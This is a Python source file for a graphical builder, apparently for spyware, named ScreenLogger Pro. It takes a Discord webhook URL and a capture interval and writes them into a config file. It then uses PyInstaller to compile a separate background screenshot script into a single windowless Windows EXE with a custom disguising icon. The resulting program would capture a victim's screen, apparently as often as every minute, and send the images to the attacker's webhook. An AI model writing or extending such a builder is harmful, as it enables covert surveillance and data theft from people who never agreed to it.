import customtkinter as ctk
from webhook import test_webhook
import os
import sys
import subprocess
from PIL import Image, ImageTk
import requests
from io import BytesIO

# Set dark blue theme
ctk.set_appearance_mode("dark") 
ctk.set_default_color_theme("dark-blue")

class ScreenLoggerApp:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("ScreenLogger Pro")
        self.root.geometry("900x700")
        self.root.minsize(800, 600)
        
        # Configure grid
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_rowconfigure(0, weight=1)
        
        # Main frame with modern styling
        self.main_frame = ctk.CTkFrame(self.root, corner_radius=10)
        self.main_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
        self.main_frame.grid_columnconfigure(0, weight=1)
        
        # Header with logo
        self.header_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.header_frame.grid(row=0, column=0, columnspan=2, pady=(10,20), sticky="ew")
        
        self.title_label = ctk.CTkLabel(
            self.header_frame, 
            text="ScreenLogger", 
            font=("Segoe UI", 24, "bold"),
            text_color="#58a6ff"
        )
        self.title_label.pack(side="left", padx=20)
        
        # Webhook section
        self.webhook_frame = ctk.CTkFrame(self.main_frame)
        self.webhook_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew")
        
        self.webhook_label = ctk.CTkLabel(
            self.webhook_frame, 
            text="Discord Webhook URL:",
            font=("Arial", 12, "bold")
        )
        self.webhook_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        self.webhook_entry = ctk.CTkEntry(
            self.webhook_frame, 
            width=500,
            placeholder_text="https://discord.com/api/webhooks/..."
        )
        self.webhook_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
        
        self.test_button = ctk.CTkButton(
            self.webhook_frame, 
            text="Test Webhook", 
            command=self.on_test_webhook,
            fg_color="#238636",
            hover_color="#2ea043",
            text_color="#ffffff"
        )
        self.test_button.grid(row=1, column=1, padx=10, pady=5)

        
        # Capture mode options
        self.mode_frame = ctk.CTkFrame(self.main_frame)
        self.mode_frame.grid(row=2, column=0, padx=10, pady=10, sticky="ew")
        
        self.mode_label = ctk.CTkLabel(
            self.mode_frame, 
            text="Capture Mode:",
            font=("Arial", 12, "bold")
        )
        self.mode_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        self.capture_mode = ctk.StringVar(value="continuous")
        self.continuous_radio = ctk.CTkRadioButton(
            self.mode_frame, 
            text="Continuous (every minute)", 
            variable=self.capture_mode, 
            value="continuous"
        )
        self.continuous_radio.grid(row=1, column=0, padx=20, pady=5, sticky="w")
        
        self.single_radio = ctk.CTkRadioButton(
            self.mode_frame, 
            text="Single capture", 
            variable=self.capture_mode, 
            value="single"
        )
        self.single_radio.grid(row=2, column=0, padx=20, pady=5, sticky="w")
        
        # Build options
        self.build_frame = ctk.CTkFrame(self.main_frame)
        self.build_frame.grid(row=3, column=0, padx=10, pady=10, sticky="ew")
        
        self.build_label = ctk.CTkLabel(
            self.build_frame, 
            text="Build Options:",
            font=("Arial", 12, "bold")
        )
        self.build_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        self.build_var = ctk.StringVar(value="exe")
        self.exe_radio = ctk.CTkRadioButton(
            self.build_frame, 
            text="Windows EXE", 
            variable=self.build_var, 
            value="exe"
        )
        self.exe_radio.grid(row=1, column=0, padx=20, pady=5, sticky="w")
        
        self.py_radio = ctk.CTkRadioButton(
            self.build_frame, 
            text="Python Script", 
            variable=self.build_var, 
            value="py"
        )
        self.py_radio.grid(row=2, column=0, padx=20, pady=5, sticky="w")
        
        # Icon selection
        self.icon_frame = ctk.CTkFrame(self.main_frame)
        self.icon_frame.grid(row=4, column=0, padx=10, pady=10, sticky="ew")
        self.icon_frame.grid_columnconfigure(0, weight=1)
        
        self.icon_label = ctk.CTkLabel(
            self.icon_frame, 
            text="EXE Icon:",
            font=("Segoe UI", 12, "bold")
        )
        self.icon_label.grid(row=0, column=0, padx=10, pady=(5,0), sticky="w")
        
        # Icon preview and selection row
        self.icon_preview_frame = ctk.CTkFrame(self.icon_frame, fg_color="transparent")
        self.icon_preview_frame.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
        
        self.icon_preview = ctk.CTkLabel(
            self.icon_preview_frame,
            text="",
            width=32,
            height=32
        )
        self.icon_preview.pack(side="left", padx=(0,10))
        
        self.icon_entry = ctk.CTkEntry(
            self.icon_preview_frame,
            width=300,
            placeholder_text="Select .ico file..."
        )
        self.icon_entry.pack(side="left", expand=True, fill="x", padx=(0,10))
        
        self.icon_button = ctk.CTkButton(
            self.icon_preview_frame,
            text="Browse",
            command=self.on_browse_icon,
            width=80,
            fg_color="#1f6feb",
            hover_color="#2c78e5",
            text_color="#ffffff"
        )
        self.icon_button.pack(side="right")
        
        # Build button
        self.build_button = ctk.CTkButton(
            self.main_frame, 
            text="Build", 
            command=self.on_build,
            fg_color="#1f6feb",
            hover_color="#2c78e5",
            font=("Segoe UI", 14, "bold"),
            height=40,
            text_color="#ffffff"
        )
        self.build_button.grid(row=5, column=0, columnspan=2, pady=20)
        
        # Status label
        self.status_label = ctk.CTkLabel(
            self.main_frame, 
            text="Ready to build",
            font=("Arial", 12)
        )
        self.status_label.grid(row=6, column=0, columnspan=2, pady=10)
        
        # Load default icon
        self.load_default_icon()
    
    def load_default_icon(self):
        try:
            # Create a simple default icon
            img = Image.new('RGB', (64, 64), color='#1f6feb')
            self.default_icon = ImageTk.PhotoImage(img)
            self.icon_preview.configure(image=self.default_icon)
        except Exception as e:
            print(f"Error creating default icon: {e}")
    
    def on_browse_icon(self):
        filetypes = (("Icon files", "*.ico"), ("All files", "*.*"))
        filename = ctk.filedialog.askopenfilename(
            title="Select icon file",
            filetypes=filetypes
        )
        if filename:
            self.icon_entry.delete(0, 'end')
            self.icon_entry.insert(0, filename)
            try:
                img = Image.open(filename)
                img = img.resize((32, 32))
                self.selected_icon = ImageTk.PhotoImage(img)
                self.icon_preview.configure(image=self.selected_icon)
            except Exception as e:
                print(f"Error loading icon: {e}")
                self.icon_preview.configure(image=self.default_icon)
    
    def on_test_webhook(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            self.status_label.configure(text="Please enter a webhook URL", text_color="#ED4245")
            return
            
        self.status_label.configure(text="Testing webhook...", text_color="white")
        success = test_webhook(webhook_url)
        
        if success:
            self.status_label.configure(text="✅ Webhook test successful!", text_color="#57F287")
        else:
            self.status_label.configure(text="❌ Webhook test failed", text_color="#ED4245")
    
    def on_build(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            self.status_label.configure(text="Please enter a webhook URL", text_color="#ED4245")
            return
            
        build_type = self.build_var.get()
        self.status_label.configure(text=f"Building {build_type.upper()}...", text_color="white")
        
        # Write config file
        with open("config.py", "w") as f:
            f.write(f'WEBHOOK_URL = "{webhook_url}"\n')
            f.write(f'CAPTURE_MODE = "{self.capture_mode.get()}"\n')
        
        if build_type == "exe":
            self.build_exe()
        else:
            self.build_py()
    
    def build_exe(self):
        try:
            # Build the EXE with all required dependencies
            icon_path = self.icon_entry.get()
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name", "ScreenLogger",
                "--add-data", "config.py;.",
                "--hidden-import=win32gui",
                "--hidden-import=win32con", 
                "--hidden-import=win32api",
                "--hidden-import=PIL",
                "--hidden-import=PIL.Image",
                "--hidden-import=PIL.ImageGrab",
                "--hidden-import=requests",
                "--runtime-tmpdir", ".",
                "--log-level=WARN",
                "background.py"
            ]
            
            if icon_path and os.path.exists(icon_path):
                cmd.extend(["--icon", icon_path])
            
            subprocess.run(cmd, check=True)
            self.status_label.configure(text="✅ EXE built successfully!", text_color="#57F287")
        except subprocess.CalledProcessError:
            self.status_label.configure(text="❌ Error building EXE", text_color="#ED4245")
        except Exception as e:
            self.status_label.configure(text=f"❌ Obfuscation failed: {str(e)}", text_color="#ED4245")
    
    def build_py(self):
        try:
            with open("screenlogger.py", "w") as f:
                f.write("from background import run\nrun()")
            self.status_label.configure(text="✅ Python script built successfully!", text_color="#57F287")
        except Exception as e:
            self.status_label.configure(text=f"❌ Error building script: {e}", text_color="#ED4245")
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = ScreenLoggerApp()
    app.run()
